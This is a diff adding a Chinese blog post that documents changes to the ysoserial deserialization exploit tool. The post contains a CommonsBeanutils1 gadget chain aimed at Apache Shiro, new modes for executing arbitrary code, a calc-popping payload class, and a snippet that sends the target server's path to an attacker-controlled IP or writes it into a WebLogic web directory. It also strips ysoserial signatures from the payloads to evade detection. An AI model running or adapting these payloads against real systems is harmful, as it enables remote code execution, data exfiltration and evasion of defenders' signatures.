@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Ysoserial改造记录 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Ysoserial改造记录" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2021/ysoserial%E6%94%B9%E9%80%A0%E8%AE%B0%E5%BD%95.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2021/ysoserial%E6%94%B9%E9%80%A0%E8%AE%B0%E5%BD%95.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Ysoserial改造记录" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Ysoserial改造记录","url":"http://0.0.0.0:4000/2021/ysoserial%E6%94%B9%E9%80%A0%E8%AE%B0%E5%BD%95.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="ysoserial改造记录">Ysoserial改造记录</h1>
+
+<h2 id="自定义-classloader-隔离运行不同版本jar包的方式">自定义 ClassLoader 隔离运行不同版本jar包的方式</h2>
+
+<h3 id="类加载机制">类加载机制</h3>
+
+<p>在 Java 中，所有的类默认通过 ClassLoader 加载，而 Java 默认提供了三层的 ClassLoader，并通过双亲委托模型的原则进行加载，其基本模型与加载位置如下（更多ClassLoader相关原理请自行搜索）：<br /><img src="https://img.sumsec.me/summersec//32u23er32ec/32u23er32ec.png" alt="image-20211122172332343" /><br /><img src="https://img.sumsec.me/summersec//52u23er52ec/52u23er52ec.png" alt="image-20211122172352427" /><br />Java 中默认的 ClassLoader 都规定了其指定的加载目录，一般也不会通过 JVM 参数来使其加载自定义的目录，所以我们需要自定义一个 ClassLoader 来加载装有不同版本的 jar 包的扩展目录，同时为了使运行扩展的 jar 包时，与启动项目实现绝对的隔离，我们需要保证他们所加载的类不会有相同的 ClassLoader，根据双亲委托模型的原理可知，我们必须使自定义的 ClassLoader 的 parent 为 null，这样不管是 JRE 自带的 jar 包或一些基础的 Class 都不会委托给 App ClassLoader（当然仅仅是将 Parent 设置为 null 是不够的，后面会说明)。与此同时这些实现了不同版本的 jar 包，是经过二次开发后的可以独立运行的项目。</p>
+
+<hr />
+
+<h3 id="实现代码">实现代码</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">StandardExecutorClassLoader</span> <span class="kd">extends</span> <span class="nc">URLClassLoader</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">baseDir</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"user.dir"</span><span class="o">)</span> <span class="o">+</span> <span class="nc">File</span><span class="o">.</span><span class="na">separator</span> <span class="o">+</span> <span class="s">"lib"</span> <span class="o">+</span> <span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">StandardExecutorClassLoader</span><span class="o">(</span><span class="nc">String</span> <span class="n">version</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// 将 Parent 设置为 null</span>
+        <span class="kd">super</span><span class="o">(</span><span class="k">new</span> <span class="no">URL</span><span class="o">[]</span> <span class="o">{},</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="n">loadResource</span><span class="o">(</span><span class="n">version</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">loadClass</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="c1">// 测试时可打印看一下</span>
+       <span class="c1">// System.out.println("Class loader: " + name);</span>
+        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">findClass</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="nc">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="nc">StandardExecutorClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">loadResource</span><span class="o">(</span><span class="nc">String</span> <span class="n">version</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">jarPath</span> <span class="o">=</span> <span class="n">baseDir</span> <span class="o">+</span> <span class="n">version</span><span class="o">;</span>
+
+        <span class="c1">// 加载对应版本目录下的 Jar 包</span>
+        <span class="n">tryLoadJarInDir</span><span class="o">(</span><span class="n">jarPath</span><span class="o">);</span>
+        <span class="c1">// 加载对应版本目录下的 lib 目录下的 Jar 包</span>
+        <span class="n">tryLoadJarInDir</span><span class="o">(</span><span class="n">jarPath</span> <span class="o">+</span> <span class="nc">File</span><span class="o">.</span><span class="na">separator</span> <span class="o">+</span> <span class="s">"lib"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">tryLoadJarInDir</span><span class="o">(</span><span class="nc">String</span> <span class="n">dirPath</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">File</span> <span class="n">dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">dirPath</span><span class="o">);</span>
+        <span class="c1">// 自动加载目录下的jar包</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">dir</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">dir</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">())</span> <span class="o">{</span>
+            <span class="k">for</span> <span class="o">(</span><span class="nc">File</span> <span class="n">file</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">listFiles</span><span class="o">())</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">endsWith</span><span class="o">(</span><span class="s">".jar"</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">this</span><span class="o">.</span><span class="na">addURL</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">addURL</span><span class="o">(</span><span class="nc">File</span> <span class="n">file</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="kd">super</span><span class="o">.</span><span class="na">addURL</span><span class="o">(</span><span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"file"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">file</span><span class="o">.</span><span class="na">getCanonicalPath</span><span class="o">()));</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+
+</code></pre></div></div>
+<p><img src="https://img.sumsec.me/summersec//40u24er40ec/40u24er40ec.png" alt="image-20211122172440217" /><br /></p>
+
+<h3 id="shiro反序列化漏洞实现">Shiro反序列化漏洞实现</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsBeanutils1_192</span> <span class="kd">implements</span> <span class="nc">ObjectPayload</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="nc">Object</span> <span class="n">templates</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">StandardExecutorClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StandardExecutorClassLoader</span><span class="o">(</span><span class="s">"1.9.2"</span><span class="o">);</span>
+        <span class="nc">Class</span> <span class="n">u</span> <span class="o">=</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"org.apache.commons.beanutils.BeanComparator"</span><span class="o">);</span>
+
+        <span class="nc">Object</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"lowestSetBit"</span><span class="o">);</span>
+        <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="o">(</span><span class="nc">Comparator</span><span class="o">&lt;?</span> <span class="kd">super</span> <span class="nc">Object</span><span class="o">&gt;)</span><span class="n">beanComparator</span><span class="o">);</span>
+
+        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+
+        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">,</span> <span class="s">"property"</span><span class="o">,</span> <span class="s">"outputProperties"</span><span class="o">);</span>
+
+        <span class="nc">Object</span><span class="o">[]</span> <span class="n">queueArray</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span><span class="nc">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">"queue"</span><span class="o">);</span>
+        <span class="n">queueArray</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+        <span class="n">queueArray</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+        <span class="k">return</span> <span class="n">queue</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="修改ysoserial使其支持任意代码执行">修改ysoserial使其支持任意代码执行</h2>
+
+<h3 id="减小payload的体积">减小payload的体积</h3>
+<p>根据文章<a href="https://xz.aliyun.com/t/6227">缩小ysoserial payload体积的几个方法</a>最大程度上减小生成payload的体积，对比结果直接减小一半多。</p>
+
+<p><img src="https://img.sumsec.me/summersec//55u46er55ec/55u46er55ec.png" alt="image.png" /><br /></p>
+
+<hr />
+
+<h3 id="支持自定义方法类">支持自定义方法，类</h3>
+<p>参考<a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r">ysoserial 工具改造（一）</a>和<a href="https://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/">使ysoserial支持执行自定义代码</a>方法将生成payload方法进行改造。<br />我这边添加了五种方式</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>序号</th>
+      <th>方式</th>
+      <th>描述</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>command</td>
+      <td>与原版相同</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>“code:代码内容”</td>
+      <td>代码量比较少时采用</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>“codebase64:代码内容base64编码”</td>
+      <td>防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>“codefile:代码文件路径”</td>
+      <td>代码量比较多时采用</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>“classfile:class路径“</td>
+      <td>利用已生成好的 class 直接获取其字节码</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>支持下面这些gadget<br /><img src="https://img.sumsec.me/summersec//55u46er55ec/55u46er55ec.png" alt="image.png" /><br /></p>
+
+<p><a name="Cl1vV"></a></p>
+<h4 id="codebase64codefilecode三种命令介绍">codebase64、codefile:、code三种命令介绍</h4>
+
+<p><br />三个命令使用方法参考，codefile:是code比较多的时候。</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">java -jar dogeser-0.0.8-SNAPSHOT-all.jar CommonsBeanutils1 code:calc
+</span></code></pre></div></div>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">String HOST = "http://192.168.149.1:1665";
+String WEB_PATH = System.getProperty("user.dir");
+
+String str_url = HOST + "/?info=" + WEB_PATH;
+try{
+    //若目标能访问我们的服务器，则发送信息到服务器上
+    java.net.URL url = new java.net.URL(str_url);
+    java.net.URLConnection conn = url.openConnection();
+    conn.connect();
+    conn.getContent();
+}catch(Exception e){
+    //若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中
+    String webPath = WEB_PATH + "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log";
+    try {
+        java.io.FileOutputStream f1 = new java.io.FileOutputStream(webPath);
+        f1.write(WEB_PATH.getBytes());
+        f1.close();
+    } catch (Exception e1) {
+        e1.printStackTrace();
+    }
+}
+</span></code></pre></div></div>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">java -jar dogeser-0.0.8-SNAPSHOT-all.jar CommonsBeanutils1 codefile:Calc.java
+</span></code></pre></div></div>
+
+<p><br /><a href="https://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/#0x04-%E6%A1%88%E4%BE%8B">案例</a><br /></p>
+
+<h4 id="classfile">classfile：</h4>
+<p>类需要继承AbstractTranslet <br />需要区分xalan\xalan\2.7.2\xalan-2.7.2.jar!\org\apache\xalan\xsltc\runtime\AbstractTranslet.class<br />这里需要的是<strong>jdk内置的AbstractTranslet</strong><br />以弹计算器为例</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">dogeser</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">8</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="nc">CommonsBeanutils1</span> <span class="nl">classfile:G:</span><span class="err">\</span><span class="nc">Calc</span><span class="o">.</span><span class="na">class</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">.</span><span class="na">ser</span>
+</code></pre></div></div>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="cm">/**
+ * @ClassName: Calc
+ * @Description: TODO
+ * @Author: Summer
+ * @Date: 2021/9/10 16:16
+ * @Version: v1.0.0
+ * @Description:
+ **/</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Calc</span> <span class="kd">extends</span> <span class="nc">AbstractTranslet</span> <span class="o">{</span>
+    <span class="kd">public</span>  <span class="nf">Calc</span><span class="o">()</span> <span class="o">{}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="nc">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="nc">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">dom</span><span class="o">,</span> <span class="nc">SerializationHandler</span><span class="o">[]</span> <span class="n">serializationHandlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<h4 id="去掉原版绝大数特征">去掉原版绝大数特征</h4>
+<p>原版大量使用ysoserial、Pwer字段，去除后效果。改掉原版package名字换成dogeser，生成的payload的就不会出现ysoserial字段。<br /><img src="https://img.sumsec.me/summersec//55u46er55ec/55u46er55ec.png" alt="image.png" /><br /></p>
+
+<h3 id="参考">参考</h3>
+
+<p><a href="https://blog.csdn.net/t894690230/article/details/73252331">https://blog.csdn.net/t894690230/article/details/73252331</a>
+<a href="https://xz.aliyun.com/t/6227">https://xz.aliyun.com/t/6227</a></p>
+
+<p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r">https://www.yuque.com/tianxiadamutou/zcfd4v/ffd33r</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
